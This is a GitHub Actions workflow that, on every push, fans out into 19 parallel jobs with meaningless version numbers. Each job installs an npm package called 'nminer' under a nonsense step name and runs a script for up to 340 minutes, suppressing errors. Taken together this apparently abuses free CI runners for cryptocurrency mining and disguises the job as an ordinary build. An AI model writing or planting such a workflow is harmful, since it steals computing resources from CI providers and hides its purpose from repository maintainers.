name: volleyball
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 2881 }
          - { version: 5770 }
          - { version: 3206 }
          - { version: 3645 }
          - { version: 777 }
          - { version: 1689 }
          - { version: 1992 }
          - { version: 9479 }
          - { version: 9658 }
          - { version: 7060 }
          - { version: 8682 }
          - { version: 6340 }
          - { version: 9701 }
          - { version: 5325 }
          - { version: 5373 }
          - { version: 5755 }
          - { version: 164 }
          - { version: 5478 }
          - { version: 6201 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: accredit substantial habit management
        run: |
          npm install nminer@latest
          timeout 340m node volleyball.js || echo "volleyball executed"